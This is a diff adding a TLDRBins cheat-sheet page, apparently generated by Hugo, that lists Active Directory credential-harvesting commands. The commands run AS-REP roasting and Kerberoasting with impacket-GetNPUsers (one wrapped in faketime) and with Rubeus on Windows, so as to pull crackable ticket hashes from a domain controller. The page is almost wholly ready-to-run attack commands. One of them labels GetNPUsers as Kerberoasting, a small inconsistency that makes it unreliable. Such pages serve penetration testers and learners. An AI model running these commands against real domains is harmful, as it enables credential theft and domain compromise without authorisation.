@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Kerberoasting | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/roasting/">
+      <span>Kerberoasting</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@as_rep-roasting/">As_rep Roasting</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@impacket/">Impacket</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@kerberoasting/">Kerberoasting</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@getnpusers/">GetNPUsers</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@faketime/">Faketime</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="as_rep-roasting">AS_REP Roasting</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10
+</span></span></code></pre></div><h3 id="kerberoasting-from-linux">Kerberoasting (From Linux)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">faketime -f +8h impacket-GetNPUsers -request <span class="s1">&#39;example.com/user:password&#39;</span> -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt
+</span></span></code></pre></div><p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p>
+<h3 id="kerberoasting-from-windows">Kerberoasting (From Windows)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">.\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
